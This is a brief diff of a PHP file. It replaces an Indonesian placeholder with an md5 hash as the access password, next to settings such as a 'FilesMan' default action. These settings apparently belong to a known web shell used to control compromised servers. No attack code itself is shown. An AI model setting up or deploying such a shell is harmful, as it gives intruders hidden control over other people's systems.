@@ -11,7 +11,7 @@ session_start();
 
 /* Configuration */
 /* Password using md5 hashes */
-$password = "password isi kode md5 hash generator"; 
+$password = "1ac82eb3644ea8f3ef0b4e9322e59cba"; 
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
